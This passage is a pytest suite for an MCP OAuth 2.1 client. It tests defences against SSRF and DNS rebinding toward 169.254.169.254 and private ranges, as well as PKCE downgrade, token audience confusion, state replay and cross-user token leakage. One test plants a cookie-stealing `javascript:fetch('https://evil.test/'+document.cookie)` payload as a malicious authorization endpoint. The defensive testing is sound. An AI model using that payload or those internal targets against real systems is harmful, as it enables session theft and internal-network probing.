"""The MCP OAuth 2.1 flow, end to end, without a socket.

Everything here runs against an httpx.MockTransport standing in for one MCP
server and one authorization server, and against a monkeypatched
``socket.getaddrinfo`` — the SSRF guard resolves names for real, so the only way
to test both the allowed and the refused case offline is to control resolution.

The assertions are deliberately weighted towards the ways this flow gets people
owned rather than towards the happy path: a replayed state, a token presented to
the wrong resource, one user reading another's account, and discovery being
talked into fetching 169.254.169.254.
"""
from __future__ import annotations

import base64
import hashlib
import json
import socket
from datetime import timedelta
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlparse

import httpx
import pytest
from conftest import create_identity
from cryptography.fernet import Fernet
from pydantic import SecretStr

from app.clock import utcnow
from app.config import get_settings
from app.database import SessionLocal
from app.models import McpOAuthClient, McpOAuthToken, McpServer, Membership, OAuthState
from app.services.crypto import decrypt_secret, encrypt_secret
from app.services.mcp import client as mcp_client
from app.services.mcp import oauth

SERVER_URL = "https://mcp.example.test/mcp"
RESOURCE = "https://mcp.example.test/mcp"
ISSUER = "https://auth.example.test"
AUTHORIZE = f"{ISSUER}/authorize"
TOKEN = f"{ISSUER}/token"
REGISTER = f"{ISSUER}/register"
RESOURCE_METADATA = (
    "https://mcp.example.test/.well-known/oauth-protected-resource/mcp"
)
PUBLIC_IP = "93.184.216.34"
PRIVATE_IP = "10.0.0.5"
METADATA_IP = "169.254.169.254"


# --------------------------------------------------------------------------
# The fake internet


class _FakePeer:
    """httpx's network-stream extension, reduced to the one call the guard makes.

    This is what makes DNS rebinding expressible offline: the monkeypatched
    resolver decides what the pre-connect check sees, and this decides what the
    socket actually reached, which is the whole point of the two being separate.
    """

    def __init__(self, address: str) -> None:
        self._address = address

    def get_extra_info(self, name: str) -> Optional[tuple]:
        return (self._address, 443) if name == "server_addr" else None


class FakeAuthServer:
    """One MCP server plus its authorization server, as an httpx transport.

    Every request is recorded so the tests can assert on what was *sent* —
    which is where PKCE and the resource indicator actually live.
    """

    def __init__(self) -> None:
        self.requests: List[httpx.Request] = []
        # URL -> the address the socket "really" reached. Anything unlisted is
        # public, so a rebinding test names exactly the one hop that goes bad.
        self.peers: Dict[str, str] = {}
        self.publish_resource_metadata = True
        self.publish_auth_metadata = True
        self.challenge_resource_metadata: Optional[str] = RESOURCE_METADATA
        self.registration_status = 201
        # None = the field is absent, which is what almost every real server
        # does. A list publishes it, and publishing it without S256 is the PKCE
        # downgrade the client has to refuse.
        self.code_challenge_methods: Optional[List[str]] = None
        self.access_token = "access-1"
        self.refresh_token = "refresh-1"
        self.expires_in: Optional[int] = 3600
        self.token_status = 200

    def handler(self, request: httpx.Request) -> httpx.Response:
        response = self._route(request)
        # Every real connection has a peer, so every fake one does too; without
        # it `peer_is_blocked` reads "unknown" and no test could distinguish a
        # guard that works from a guard that is not called.
        response.extensions["network_stream"] = _FakePeer(
            self.peers.get(str(request.url), PUBLIC_IP)
        )
        return response

    def _route(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        url = str(request.url)
        if url == SERVER_URL and request.method == "POST":
            headers = {}
            if self.challenge_resource_metadata is not None:
                headers["WWW-Authenticate"] = (
                    f'Bearer realm="mcp", '
                    f'resource_metadata="{self.challenge_resource_metadata}"'
                )
            return httpx.Response(401, headers=headers)
        if url == RESOURCE_METADATA and self.publish_resource_metadata:
            return httpx.Response(
                200,
                json={
                    "resource": RESOURCE,
                    "authorization_servers": [ISSUER],
                    "scopes_supported": ["mcp:read", "mcp:write"],
                },
            )
        if url == f"{ISSUER}/.well-known/oauth-authorization-server":
            if not self.publish_auth_metadata:
                return httpx.Response(404)
            metadata: Dict[str, Any] = {
                "issuer": ISSUER,
                "authorization_endpoint": AUTHORIZE,
                "token_endpoint": TOKEN,
                "registration_endpoint": REGISTER,
                "scopes_supported": ["mcp:read"],
            }
            if self.code_challenge_methods is not None:
                metadata["code_challenge_methods_supported"] = self.code_challenge_methods
            return httpx.Response(200, json=metadata)
        if url == REGISTER and request.method == "POST":
            if self.registration_status not in (200, 201):
                return httpx.Response(self.registration_status, json={})
            return httpx.Response(
                self.registration_status,
                json={
                    "client_id": "client-abc",
                    "registration_access_token": "reg-token-xyz",
                    "registration_client_uri": f"{ISSUER}/register/client-abc",
                    "scope": "mcp:read",
                },
            )
        if url == TOKEN and request.method == "POST":
            if self.token_status != 200:
                return httpx.Response(self.token_status, json={"error": "invalid_grant"})
            body: Dict[str, Any] = {
                "access_token": self.access_token,
                "token_type": "Bearer",
            }
            if self.refresh_token:
                body["refresh_token"] = self.refresh_token
            if self.expires_in is not None:
                body["expires_in"] = self.expires_in
            return httpx.Response(200, json=body)
        return httpx.Response(404, json={})

    def form(self, url: str) -> Dict[str, str]:
        """The most recent form POST to `url`, parsed."""
        for request in reversed(self.requests):
            if str(request.url) == url and request.method == "POST":
                parsed = parse_qs(request.content.decode())
                return {key: value[0] for key, value in parsed.items()}
        raise AssertionError(f"no POST to {url}")

    def json_body(self, url: str) -> Dict[str, Any]:
        for request in reversed(self.requests):
            if str(request.url) == url and request.method == "POST":
                loaded = json.loads(request.content.decode())
                assert isinstance(loaded, dict)
                return loaded
        raise AssertionError(f"no POST to {url}")


@pytest.fixture
def server_double(monkeypatch) -> FakeAuthServer:
    double = FakeAuthServer()
    monkeypatch.setattr(oauth, "HTTP_TRANSPORT", httpx.MockTransport(double.handler))
    return double


@pytest.fixture
def public_dns(monkeypatch) -> None:
    """Every hostname resolves to one public address unless a test says otherwise."""
    monkeypatch.setattr(
        socket,
        "getaddrinfo",
        lambda *args, **kwargs: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", (PUBLIC_IP, 443))
        ],
    )


@pytest.fixture
def encryption() -> Any:
    settings = get_settings()
    original = settings.integrations_encryption_key
    settings.integrations_encryption_key = SecretStr(Fernet.generate_key().decode())
    yield settings
    settings.integrations_encryption_key = original


@pytest.fixture
def workspace(encryption) -> Any:
    """One workspace, one remote MCP server, and two members of that workspace.

    The colleague is deliberately made a full member of the owner's workspace,
    because a per-user token check is only meaningful against someone who can
    already see the server row: two people sharing a workspace must not share a
    Linear account, and an outsider would prove nothing about that.
    """
    owner = create_identity(name="Owner", workspace_name="MCP workspace")
    colleague = create_identity(name="Colleague")
    db = SessionLocal()
    try:
        db.add(
            Membership(
                workspace_id=owner.workspace_id,
                user_id=colleague.user_id,
                role="member",
            )
        )
        server = McpServer(
            workspace_id=owner.workspace_id,
            name="remote",
            transport="http",
            url=SERVER_URL,
        )
        db.add(server)
        db.commit()
        server_id = server.id
    finally:
        db.close()
    yield {"owner": owner, "colleague": colleague, "server_id": server_id}
    db = SessionLocal()
    try:
        db.query(McpOAuthToken).delete()
        db.query(McpOAuthClient).delete()
        db.query(OAuthState).delete()
        db.query(McpServer).filter(McpServer.id == server_id).delete()
        db.commit()
    finally:
        db.close()


def _session_and_server(workspace):
    db = SessionLocal()
    server = db.get(McpServer, workspace["server_id"])
    assert server is not None
    return db, server


# --------------------------------------------------------------------------
# Discovery


def test_discovery_walks_the_401_chain(server_double, public_dns, encryption):
    resource, auth_server = oauth.discover(SERVER_URL, encryption)
    assert resource.resource == RESOURCE
    assert resource.authorization_servers == (ISSUER,)
    assert auth_server.token_endpoint == TOKEN
    assert auth_server.registration_endpoint == REGISTER


def test_discovery_falls_back_when_nothing_is_published(
    server_double, public_dns, encryption
):
    """Real servers publish partial metadata; the failure must not be a KeyError."""
    server_double.challenge_resource_metadata = None
    server_double.publish_resource_metadata = False
    server_double.publish_auth_metadata = False
    resource, auth_server = oauth.discover(SERVER_URL, encryption)
    # No protected-resource document: the resource server is its own issuer.
    assert resource.authorization_servers == ("https://mcp.example.test",)
    # No authorization-server document either: the MCP spec's default paths.
    assert auth_server.authorization_endpoint == "https://mcp.example.test/authorize"
    assert auth_server.token_endpoint == "https://mcp.example.test/token"


def test_challenge_pointing_at_another_host_is_refused(
    server_double, public_dns, encryption
):
    """A 401 that nominates somebody else's metadata is an attacker choosing
    which authorization server the user will be sent to consent at."""
    server_double.challenge_resource_metadata = (
        "https://evil.example.test/.well-known/oauth-protected-resource"
    )
    with pytest.raises(oauth.McpOAuthError, match="another host"):
        oauth.discover(SERVER_URL, encryption)


def test_www_authenticate_parsing_handles_both_quoting_styles():
    quoted = 'Bearer realm="x", resource_metadata="https://a.test/.well-known/x"'
    assert oauth.parse_challenge(quoted) == "https://a.test/.well-known/x"
    bare = "Bearer resource_metadata=https://a.test/rm, error=invalid_token"
    assert oauth.parse_challenge(bare) == "https://a.test/rm"
    assert oauth.parse_challenge("Bearer realm=\"x\"") == ""
    assert oauth.parse_challenge("") == ""


# --------------------------------------------------------------------------
# SSRF: every discovery hop, not only the first


def _resolves_to(monkeypatch, address: str) -> None:
    monkeypatch.setattr(
        socket,
        "getaddrinfo",
        lambda *args, **kwargs: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", (address, 443))
        ],
    )


def test_cloud_metadata_address_is_refused(server_double, monkeypatch, encryption):
    _resolves_to(monkeypatch, "169.254.169.254")
    with pytest.raises(oauth.McpOAuthError, match="Refused to contact"):
        oauth.discover(SERVER_URL, encryption)
    assert server_double.requests == []


def test_private_range_is_refused(server_double, monkeypatch, encryption):
    _resolves_to(monkeypatch, "10.0.0.5")
    with pytest.raises(oauth.McpOAuthError, match="Refused to contact"):
        oauth.discover(SERVER_URL, encryption)
    assert server_double.requests == []


def test_a_later_hop_is_validated_too(server_double, monkeypatch, encryption):
    """The guard is not a front door: the issuer comes from the server's own
    metadata, so it gets resolved and rejected on its own merits."""
    resolutions = {
        "mcp.example.test": PUBLIC_IP,
        # The MCP server nominates an issuer that resolves inside the VPC.
        "auth.example.test": "172.16.9.9",
    }

    def resolve(host: str, *args: Any, **kwargs: Any) -> Any:
        address = resolutions.get(host, PUBLIC_IP)
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (address, 443))]

    monkeypatch.setattr(socket, "getaddrinfo", resolve)
    with pytest.raises(oauth.McpOAuthError, match="Refused to contact"):
        oauth.discover(SERVER_URL, encryption)
    # It got as far as the resource metadata, then stopped at the issuer.
    fetched = [str(request.url) for request in server_double.requests]
    assert RESOURCE_METADATA in fetched
    assert not any(url.startswith(ISSUER) for url in fetched)


def test_plain_http_destinations_are_refused(server_double, public_dns, encryption):
    with pytest.raises(oauth.McpOAuthError, match="Refused to contact"):
        oauth.probe_authentication("http://mcp.example.test/mcp", encryption)


# --------------------------------------------------------------------------
# SSRF, second half: the address checked is not the address connected to
#
# `_validate_destination` resolves a name; httpx resolves it again to open the
# socket. A host that answers a public address for the first lookup and a
# private one for the second walks straight past a check that only ever saw the
# first answer — so every hop below keeps `public_dns` (the pre-connect check
# passes, exactly as it would for the attacker) and moves only the peer.


def test_a_rebound_mcp_endpoint_is_refused(server_double, public_dns, encryption):
    """The front door. The probe POST is where the chain starts, and the reply
    it reads is what nominates every later URL."""
    server_double.peers[SERVER_URL] = METADATA_IP
    with pytest.raises(oauth.McpOAuthError, match="blocked network"):
        oauth.discover(SERVER_URL, encryption)


def test_a_rebound_metadata_fetch_is_refused_rather_than_skipped(
    server_double, public_dns, encryption
):
    """Not merely "not used": aborted.

    `_get_metadata` answers None for a 404 and discovery tries the next
    candidate spelling. Treating a connection that landed inside the same way
    would let the flow shrug and continue, and the fallback at the end of
    `fetch_protected_resource` would happily invent an issuer — the response
    would have been read from a private host either way.
    """
    server_double.peers[RESOURCE_METADATA] = PRIVATE_IP
    with pytest.raises(oauth.McpOAuthError, match="blocked network"):
        oauth.discover(SERVER_URL, encryption)
    # It reached the metadata document and stopped there, never nominating an
    # issuer off the back of it.
    fetched = [str(request.url) for request in server_double.requests]
    assert fetched[-1] == RESOURCE_METADATA
    assert not any(url.startswith(ISSUER) for url in fetched)


def test_a_rebound_authorization_server_document_is_refused(
    server_double, public_dns, encryption
):
    """The issuer is a URL the MCP server chose, so its metadata hop is the one
    an attacker actually wants — it names the endpoints the browser is sent to."""
    server_double.peers[f"{ISSUER}/.well-known/oauth-authorization-server"] = PRIVATE_IP
    with pytest.raises(oauth.McpOAuthError, match="blocked network"):
        oauth.discover(SERVER_URL, encryption)


def test_a_rebound_registration_endpoint_is_refused(
    server_double, public_dns, workspace, encryption
):
    """Registration POSTs this deployment's callback URL and takes a client id
    back; a rebound issuer would be handed the former and choose the latter."""
    server_double.peers[REGISTER] = PRIVATE_IP
    db, server = _session_and_server(workspace)
    try:
        with pytest.raises(oauth.McpOAuthError, match="blocked network"):
            oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        # Nothing was believed: no registration row, and so no authorize URL.
        assert db.query(McpOAuthClient).count() == 0
    finally:
        db.close()


def test_a_rebound_token_endpoint_never_yields_a_stored_token(
    server_double, public_dns, workspace, encryption
):
    """The code has already left by the time the peer is knowable — that is what
    a post-connect check cannot fix. What it does stop is the *answer* being
    believed: an internal host does not get to mint us an access token that we
    would then store and present to the real server."""
    db, server = _session_and_server(workspace)
    try:
        oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        record = db.query(OAuthState).one()
        server_double.peers[TOKEN] = METADATA_IP
        with pytest.raises(oauth.McpOAuthError, match="blocked network"):
            oauth.complete_authorization(db, record.state, "auth-code-1", encryption)
        assert db.query(McpOAuthToken).count() == 0
    finally:
        db.close()


def test_a_public_peer_still_connects(server_double, public_dns, workspace, encryption):
    """The control. Every test above leaves the pre-connect check passing, so
    without this one they would all pass equally against a guard that refused
    every connection."""
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        token = db.query(McpOAuthToken).one()
        assert decrypt_secret(token.access_token_enc) == "access-1"
    finally:
        db.close()


# --------------------------------------------------------------------------
# Registration and the authorize redirect


def test_registration_persists_the_client_and_its_registration_token(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        row = db.query(McpOAuthClient).one()
        assert row.client_id == "client-abc"
        assert row.issuer == ISSUER
        assert row.registration_client_uri == f"{ISSUER}/register/client-abc"
        # RFC 7592 token, stored the way every other credential is: encrypted.
        assert "reg-token-xyz" not in row.registration_access_token_enc
        assert decrypt_secret(row.registration_access_token_enc) == "reg-token-xyz"
        sent = server_double.json_body(REGISTER)
        assert sent["redirect_uris"] == [oauth.callback_url(encryption)]
        assert sent["token_endpoint_auth_method"] == "none"
    finally:
        db.close()


def test_registration_is_reused_on_a_second_connect(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        oauth.begin_authorization(db, server, workspace["colleague"].user_id, encryption)
        assert db.query(McpOAuthClient).count() == 1
        registrations = [
            request
            for request in server_double.requests
            if str(request.url) == REGISTER
        ]
        assert len(registrations) == 1
    finally:
        db.close()


def test_authorize_url_carries_s256_pkce_and_a_resource_indicator(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        url = oauth.begin_authorization(
            db, server, workspace["owner"].user_id, encryption
        )
        query = {key: value[0] for key, value in parse_qs(urlparse(url).query).items()}
        assert url.startswith(AUTHORIZE)
        assert query["response_type"] == "code"
        assert query["client_id"] == "client-abc"
        assert query["code_challenge_method"] == "S256"
        assert query["resource"] == RESOURCE
        assert query["redirect_uri"] == oauth.callback_url(encryption)

        record = db.query(OAuthState).one()
        assert record.provider == "mcp"
        assert record.server_id == server.id
        verifier = decrypt_secret(record.pkce_verifier_enc)
        # The verifier never leaves the server: what the browser carries is only
        # its hash, and the two must not be the same string.
        assert verifier not in url
        expected = base64.urlsafe_b64encode(
            hashlib.sha256(verifier.encode()).digest()
        ).rstrip(b"=").decode()
        assert query["code_challenge"] == expected
    finally:
        db.close()


def _lying_document(
    double: FakeAuthServer, monkeypatch: Any, target: str, **overrides: Any
) -> None:
    """Reinstall the transport with one metadata document's fields overridden.

    A fresh MockTransport rather than a patched attribute: the fixture already
    bound ``double.handler`` into a transport, so reassigning the method after
    the fact would change nothing.
    """
    original = double.handler

    def handler(request: httpx.Request) -> httpx.Response:
        response = original(request)
        if str(request.url) == target and response.status_code == 200:
            document = dict(response.json())
            document.update(overrides)
            return httpx.Response(200, json=document)
        return response

    monkeypatch.setattr(oauth, "HTTP_TRANSPORT", httpx.MockTransport(handler))


def test_a_non_https_authorization_endpoint_is_refused(
    server_double, public_dns, workspace, encryption, monkeypatch
):
    """The authorize URL is assigned to location.href by the web app.

    A metadata document that answers `javascript:…//` would therefore run in the
    app's origin with the user's session — everything the flow appends after it
    is a comment. This is the only URL in the flow the browser follows rather
    than the server, and it is guarded like every other hop.
    """
    _lying_document(
        server_double,
        monkeypatch,
        f"{ISSUER}/.well-known/oauth-authorization-server",
        authorization_endpoint="javascript:fetch('https://evil.test/'+document.cookie)//",
    )
    db, server = _session_and_server(workspace)
    try:
        with pytest.raises(oauth.McpOAuthError):
            oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
    finally:
        db.close()


def test_the_authorize_leg_ignores_a_resource_the_document_claimed(
    server_double, public_dns, workspace, encryption, monkeypatch
):
    """RFC 8707 audience confusion: the resource metadata may name anyone.

    The document is served by the resource itself, so a hostile MCP server can
    claim to be `https://mcp.corp.test/mcp` and have the user consent to a token
    minted for that audience — which we would then present to the hostile
    server. Both legs must send the canonical URI of the server we call.
    """
    _lying_document(
        server_double,
        monkeypatch,
        RESOURCE_METADATA,
        resource="https://mcp.corp.test/mcp",
    )
    db, server = _session_and_server(workspace)
    try:
        url = oauth.begin_authorization(
            db, server, workspace["owner"].user_id, encryption
        )
        query = {key: value[0] for key, value in parse_qs(urlparse(url).query).items()}
        assert query["resource"] == RESOURCE
    finally:
        db.close()


def test_a_server_without_dynamic_registration_says_so(
    server_double, public_dns, workspace, encryption
):
    server_double.registration_status = 403
    db, server = _session_and_server(workspace)
    try:
        with pytest.raises(oauth.McpOAuthError, match="registration was refused"):
            oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
    finally:
        db.close()


def test_metadata_naming_another_issuer_is_discarded(
    server_double, public_dns, monkeypatch, encryption
):
    """RFC 8414 §3.3: a document whose `issuer` is not the one the well-known
    URL was built from MUST NOT be used. Unchecked, the document decides both
    the name shown to the user and the host the endpoints live on, so it can
    claim to be Google while pointing the token exchange at anywhere it likes."""

    def handler(request: httpx.Request) -> httpx.Response:
        if str(request.url) == f"{ISSUER}/.well-known/oauth-authorization-server":
            return httpx.Response(
                200,
                json={
                    "issuer": "https://accounts.google.test",
                    "authorization_endpoint": "https://evil.example.test/authorize",
                    "token_endpoint": "https://evil.example.test/token",
                },
            )
        return httpx.Response(404, json={})

    monkeypatch.setattr(oauth, "HTTP_TRANSPORT", httpx.MockTransport(handler))
    auth_server = oauth.fetch_auth_server(ISSUER, encryption)
    # Discarded, and the MCP default endpoints at the issuer we asked about are
    # used instead — never evil.example.test, and never under Google's name.
    assert auth_server.issuer == ISSUER
    assert auth_server.token_endpoint == f"{ISSUER}/token"
    assert auth_server.authorization_endpoint == f"{ISSUER}/authorize"


def test_an_authorization_server_that_publishes_no_s256_is_refused(
    server_double, public_dns, workspace, encryption
):
    """PKCE downgrade. A server that advertises its methods without S256 will
    ignore the challenge, and for a public client the code is then bearer-grade
    on its own; `plain` is not a fallback worth taking."""
    server_double.code_challenge_methods = ["plain"]
    db, server = _session_and_server(workspace)
    try:
        with pytest.raises(oauth.McpOAuthError, match="S256"):
            oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        # Refused before anything was registered or any state row minted.
        assert db.query(McpOAuthClient).count() == 0
        assert db.query(OAuthState).count() == 0
    finally:
        db.close()


def test_an_authorization_server_that_publishes_s256_still_connects(
    server_double, public_dns, workspace, encryption
):
    """The check must not fire on the servers it is meant to allow."""
    server_double.code_challenge_methods = ["S256", "plain"]
    db, server = _session_and_server(workspace)
    try:
        url = oauth.begin_authorization(
            db, server, workspace["owner"].user_id, encryption
        )
        assert url.startswith(AUTHORIZE)
    finally:
        db.close()


# --------------------------------------------------------------------------
# Callback, token exchange, refresh


def _connect(db, server, user_id, settings) -> str:
    """Run begin + complete, returning the state that was consumed."""
    oauth.begin_authorization(db, server, user_id, settings)
    record = (
        db.query(OAuthState)
        .filter(OAuthState.server_id == server.id, OAuthState.user_id == user_id)
        .one()
    )
    state = record.state
    oauth.complete_authorization(db, state, "auth-code-1", settings)
    return state


def test_callback_exchanges_the_code_with_the_verifier_and_resource(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        record = db.query(OAuthState).one()
        verifier = decrypt_secret(record.pkce_verifier_enc)
        token = oauth.complete_authorization(db, record.state, "auth-code-1", encryption)

        sent = server_double.form(TOKEN)
        assert sent["grant_type"] == "authorization_code"
        assert sent["code"] == "auth-code-1"
        assert sent["code_verifier"] == verifier
        assert sent["redirect_uri"] == oauth.callback_url(encryption)
        # RFC 8707 on the token leg as well, not only on authorize.
        assert sent["resource"] == RESOURCE

        assert token.resource == RESOURCE
        assert token.status == "connected"
        assert "access-1" not in token.access_token_enc
        assert decrypt_secret(token.access_token_enc) == "access-1"
        assert token.token_expires_at is not None
    finally:
        db.close()


def test_a_replayed_state_is_refused(server_double, public_dns, workspace, encryption):
    db, server = _session_and_server(workspace)
    try:
        state = _connect(db, server, workspace["owner"].user_id, encryption)
        assert db.query(OAuthState).count() == 0
        with pytest.raises(oauth.McpOAuthError, match="already been used"):
            oauth.complete_authorization(db, state, "auth-code-1", encryption)
    finally:
        db.close()


def test_an_unknown_state_is_refused(server_double, public_dns, workspace, encryption):
    db, server = _session_and_server(workspace)
    try:
        with pytest.raises(oauth.McpOAuthError, match="invalid"):
            oauth.complete_authorization(db, "not-a-state", "code", encryption)
    finally:
        db.close()


def test_an_expired_state_is_refused_and_still_consumed(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        record = db.query(OAuthState).one()
        record.created_at = utcnow() - oauth.STATE_TTL - timedelta(seconds=1)
        db.commit()
        with pytest.raises(oauth.McpOAuthError, match="expired"):
            oauth.complete_authorization(db, record.state, "code", encryption)
        assert db.query(OAuthState).count() == 0
    finally:
        db.close()


def test_token_is_refreshed_before_it_expires(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        row = db.query(McpOAuthToken).one()
        # Inside the leeway: still valid, but a long agent turn would outlive it.
        row.token_expires_at = utcnow() + timedelta(
            seconds=encryption.mcp_token_refresh_leeway_seconds - 30
        )
        db.commit()
        server_double.access_token = "access-2"

        token = oauth.access_token(db, server, workspace["owner"].user_id, encryption)
        assert token == "access-2"
        sent = server_double.form(TOKEN)
        assert sent["grant_type"] == "refresh_token"
        assert sent["refresh_token"] == "refresh-1"
        assert sent["resource"] == RESOURCE
    finally:
        db.close()


def test_a_still_fresh_token_is_not_refreshed(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        before = len(server_double.requests)
        assert oauth.access_token(
            db, server, workspace["owner"].user_id, encryption
        ) == "access-1"
        assert len(server_double.requests) == before
    finally:
        db.close()


def test_a_rejected_refresh_marks_the_row_expired(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        row = db.query(McpOAuthToken).one()
        row.token_expires_at = utcnow() - timedelta(seconds=1)
        db.commit()
        server_double.token_status = 400
        assert oauth.access_token(db, server, workspace["owner"].user_id, encryption) is None
        db.refresh(row)
        assert row.status == "expired"
    finally:
        db.close()


def test_a_forced_refresh_that_fails_does_not_hand_back_the_rejected_token(
    server_double, public_dns, workspace, encryption
):
    """The 401-retry path asks with force_refresh; returning the same token
    would make the client retry with the credential that was just rejected."""
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        server_double.token_status = 400
        assert (
            oauth.access_token(
                db, server, workspace["owner"].user_id, encryption, force_refresh=True
            )
            is None
        )
        row = db.query(McpOAuthToken).one()
        db.refresh(row)
        assert row.status == "expired"
        assert oauth.auth_status(db, server, workspace["owner"].user_id).connected is False
    finally:
        db.close()


def test_the_token_provider_is_what_the_client_layer_gets(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        provide = oauth.token_provider(
            db, server, workspace["owner"].user_id, encryption
        )
        assert provide(False) == "access-1"
        server_double.access_token = "access-2"
        assert provide(True) == "access-2"
    finally:
        db.close()


# --------------------------------------------------------------------------
# The two checks that stop a token being used where it should not be


def test_a_token_minted_for_another_resource_is_refused(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        row = db.query(McpOAuthToken).one()
        # Exactly the replay this check exists for: a token minted for server A
        # sitting on the row for server B.
        row.resource = "https://other.example.test/mcp"
        db.commit()
        with pytest.raises(oauth.McpOAuthError, match="different server"):
            oauth.access_token(db, server, workspace["owner"].user_id, encryption)
    finally:
        db.close()


def test_one_users_token_is_unreachable_by_another_in_the_same_workspace(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        # Same workspace, same server, different human.
        assert (
            oauth.access_token(db, server, workspace["colleague"].user_id, encryption)
            is None
        )
        assert oauth.auth_status(db, server, workspace["colleague"].user_id).connected is False

        server_double.access_token = "access-colleague"
        _connect(db, server, workspace["colleague"].user_id, encryption)
        rows = {
            row.user_id: decrypt_secret(row.access_token_enc)
            for row in db.query(McpOAuthToken).all()
        }
        assert rows == {
            workspace["owner"].user_id: "access-1",
            workspace["colleague"].user_id: "access-colleague",
        }
    finally:
        db.close()


def test_disconnect_only_forgets_the_caller(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        _connect(db, server, workspace["colleague"].user_id, encryption)
        assert oauth.disconnect(db, server, workspace["owner"].user_id) is True
        assert oauth.access_token(db, server, workspace["owner"].user_id, encryption) is None
        assert (
            oauth.access_token(db, server, workspace["colleague"].user_id, encryption)
            is not None
        )
        assert oauth.disconnect(db, server, workspace["owner"].user_id) is False
    finally:
        db.close()


def _rotate_issuer(double: FakeAuthServer, monkeypatch: Any, issuer: str) -> None:
    """Make the server advertise a *different* authorization server from now on.

    Serves a complete second fake internet at `issuer` rather than rewriting the
    first, because the point of the test is that the old issuer is still there
    and still holds a credential.
    """
    original = double.handler

    def handler(request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        if url == RESOURCE_METADATA:
            return httpx.Response(
                200,
                json={"resource": RESOURCE, "authorization_servers": [issuer]},
            )
        if url == f"{issuer}/.well-known/oauth-authorization-server":
            return httpx.Response(
                200,
                json={
                    "issuer": issuer,
                    "authorization_endpoint": f"{issuer}/authorize",
                    "token_endpoint": f"{issuer}/token",
                    "registration_endpoint": f"{issuer}/register",
                },
            )
        if url.startswith(f"{issuer}/register"):
            return httpx.Response(201, json={"client_id": "client-rotated"})
        if url.startswith(f"{issuer}/token"):
            return httpx.Response(
                200, json={"access_token": "rotated-access", "token_type": "Bearer"}
            )
        return original(request)

    monkeypatch.setattr(oauth, "HTTP_TRANSPORT", httpx.MockTransport(handler))


def test_a_rotated_issuer_never_receives_the_previous_issuers_tokens(
    server_double, public_dns, workspace, encryption, monkeypatch
):
    """A server that moves its authorization server voids what the old one minted.

    This is the compromise case, not the housekeeping one: a token row carries no
    issuer, so if two registrations for one server could coexist, the refresh leg
    — which carries a long-lived refresh token the *previous* issuer minted —
    would be aimed at whichever host the server most recently nominated. The
    victim takes no action; another workspace member pressing Connect is enough.
    """
    rogue = "https://auth.attacker.test"
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        _rotate_issuer(server_double, monkeypatch, rogue)
        oauth.begin_authorization(db, server, workspace["colleague"].user_id, encryption)

        # One server, one registration: the ambiguity is gone at the source.
        assert {row.issuer for row in db.query(McpOAuthClient).all()} == {rogue}
        # And the owner's credential is void rather than forwardable.
        row = (
            db.query(McpOAuthToken)
            .filter(McpOAuthToken.user_id == workspace["owner"].user_id)
            .one()
        )
        assert row.access_token_enc == "" and row.refresh_token_enc == ""
        assert row.status == "expired"
        assert oauth.access_token(db, server, workspace["owner"].user_id, encryption) is None

        forwarded = [
            request
            for request in server_double.requests
            if request.method == "POST" and str(request.url) == f"{rogue}/token"
        ]
        assert not any(b"refresh-1" in request.content for request in forwarded)
    finally:
        db.close()


def test_a_refresh_that_lost_the_race_reuses_the_token_it_found(
    server_double, public_dns, workspace, encryption
):
    """Two turns for one (server, user) must not both spend the refresh token.

    OAuth 2.1 rotates refresh tokens for public clients and RFC 6819 has the
    authorization server treat a replay as a breach and revoke the whole grant
    family — so the loser of the race silently logs the user out. Under the row
    lock the loser re-reads first; finding a token that now outlives the
    threshold that sent it here, it uses that one and makes no request at all.
    """
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        row = db.query(McpOAuthToken).one()
        # Stand in for the winner having just written a fresh token.
        row.token_expires_at = utcnow() + timedelta(hours=1)
        db.commit()
        fresh = decrypt_secret(row.access_token_enc)

        before = len(server_double.requests)
        got = oauth._refresh(
            db,
            server,
            row,
            oauth.canonical_resource(server.url),
            encryption,
            # The threshold that made *this* caller think it was stale, now
            # already satisfied by the winner's write.
            deadline=utcnow(),
        )

        assert got == fresh
        assert len(server_double.requests) == before, (
            "the loser of the refresh race still spent its refresh token"
